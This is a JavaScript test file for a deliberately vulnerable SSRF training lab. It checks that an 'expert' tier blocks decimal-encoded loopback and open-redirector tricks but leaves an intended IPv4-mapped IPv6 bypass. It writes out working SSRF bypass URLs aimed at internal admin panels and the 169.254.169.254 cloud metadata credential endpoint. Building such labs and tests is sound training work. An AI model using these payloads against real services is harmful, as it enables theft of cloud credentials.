/**
 * tests/ssrf-expert-tier.test.js — Phase 7 addition: genuine Expert-tier
 * content for the SSRF lab (upgrade-spec Section 15's fourth tier,
 * Section 24's "alternate address representations"), plus the
 * difficulty-guard's selective per-lab passthrough that makes this safe
 * to enable for exactly one lab without silently opening the door for
 * the other 88.
 *
 * The core thing this proves: expert tier is not "hard tier but stricter"
 * — it closes hard's two holes AND has a genuinely different one, and
 * every one of those four behavioral changes is checked explicitly rather
 * than just checking that a flag eventually comes out.
 */
const http = require("http");

let pass = 0, fail = 0;
function check(name, cond, extra) { if (cond) { pass++; console.log("PASS:", name); } else { fail++; console.log("FAIL:", name, extra || ""); } }
setTimeout(() => { console.log(`DEADLINE HIT: ${pass} passed, ${fail} failed (incomplete)`); process.exit(2); }, 30000).unref();

function get(urlPath) {
  return new Promise((resolve, reject) => {
    http.get(`http://localhost:3000${urlPath}`, (res) => {
      let body = "";
      res.on("data", (d) => (body += d));
      res.on("end", () => resolve({ status: res.statusCode, body }));
    }).on("error", reject);
  });
}
function ssrfUrl(difficulty, targetUrl) {
  return `/vuln/ssrf?difficulty=${difficulty}&url=${encodeURIComponent(targetUrl)}`;
}

async function run() {
  // --- the guard lets expert through for ssrf specifically -------------
  const rSsrfExpert = await get(ssrfUrl("expert", "http://example.com/"));
  check("ssrf accepts ?difficulty=expert at all (guard passthrough works)", rSsrfExpert.status === 200);

  // Uses csp-bypass as the "no expert content" control — deliberately NOT
  // idor, which used to be a safe example when this test was first
  // written but has since gotten real Expert content of its own (see
  // tests/idor-expert-tier.test.js). Same recurring lesson as the
  // Phase 2b/2c re-skinning tests and tests/difficulty-guard.test.js: a
  // "control" example from a category that's actively growing goes stale
  // — pick one from well outside whatever's being extended right now.
  const rOtherExpert = await get("/vuln/csp-bypass?difficulty=expert");
  check("a different, non-expert-enabled lab still gets a proper 501 for ?difficulty=expert", rOtherExpert.status === 501);

  // --- expert closes BOTH hard-tier holes -------------------------------
  const rNumeric = await get(ssrfUrl("expert", "http://2130706433/admin")); // decimal-encoded 127.0.0.1
  check("expert: numeric-encoded internal IP is blocked (was allowed at hard)", /was blocked/.test(rNumeric.body), rNumeric.body.match(/<div class="result">[^<]*/));
  check("expert: no flag leaks via the numeric-encoding attempt", !/FLAG\{ssrf-expert-/.test(rNumeric.body));

  const rRedir = await get(ssrfUrl("expert", "http://safe-redirector.securecorp-demo.test/go?to=" + encodeURIComponent("http://169.254.169.254/latest/meta-data/iam/security-credentials/admin")));
  check("expert: the open-redirector chain is blocked (was allowed at hard)", /was blocked/.test(rRedir.body));
  check("expert: no flag leaks via the redirector attempt", !/FLAG\{ssrf-expert-/.test(rRedir.body));

  // --- a literal internal address is still blocked, same as hard -------
  const rLiteral = await get(ssrfUrl("expert", "http://127.0.0.1/admin"));
  check("expert: a plain literal internal address is still blocked", /was blocked/.test(rLiteral.body));

  // --- expert's own, genuinely different gap: bracketed IPv6 -----------
  const rIpv6Loopback = await get(ssrfUrl("expert", "http://[::ffff:127.0.0.1]/admin"));
  check("expert: IPv4-mapped IPv6 loopback reaches the internal admin panel", /Internal Admin Panel/.test(rIpv6Loopback.body));
  const flagMatch = rIpv6Loopback.body.match(/FLAG\{ssrf-expert-[a-f0-9]+\}/);
  check("expert: a real, correctly-tiered flag is issued via the IPv6 bypass", !!flagMatch, rIpv6Loopback.body.slice(0, 200));

  const rIpv6Metadata = await get(ssrfUrl("expert", "http://[::ffff:169.254.169.254]/latest/meta-data/iam/security-credentials/admin"));
  check("expert: IPv4-mapped IPv6 also reaches the metadata service specifically", /AccessKeyId/.test(rIpv6Metadata.body));

  // --- confirm this is a NEW gap, not present at hard tier --------------
  const rHardIpv6 = await get(ssrfUrl("hard", "http://[::ffff:169.254.169.254]/latest/meta-data/iam/security-credentials/admin"));
  check("hard tier does NOT have the IPv6 bypass (it's expert-specific)", !/AccessKeyId/.test(rHardIpv6.body));

  // --- confirm hard tier's own techniques are completely unchanged -----
  const rHardNumeric = await get(ssrfUrl("hard", "http://2130706433/admin"));
  check("hard tier: numeric encoding still works exactly as before (unchanged by this phase)", /Internal Admin Panel/.test(rHardNumeric.body));
  const rHardRedir = await get(ssrfUrl("hard", "http://safe-redirector.securecorp-demo.test/go?to=" + encodeURIComponent("http://169.254.169.254/latest/meta-data/iam/security-credentials/admin")));
  check("hard tier: the redirector technique still works exactly as before (unchanged by this phase)", /AccessKeyId/.test(rHardRedir.body));

  // --- a normal external URL at expert is neither blocked nor flagged --
  const rNormal = await get(ssrfUrl("expert", "http://example.com/"));
  check("expert: an ordinary external URL is not blocked", !/was blocked/.test(rNormal.body));
  check("expert: an ordinary external URL yields no flag (nothing to find there)", !/FLAG\{/.test(rNormal.body));

  console.log(`\n=== ${pass} passed, ${fail} failed ===`);
  process.exit(fail > 0 ? 1 : 0);
}

run().catch((e) => { console.error("ERROR:", e.message); process.exit(1); });
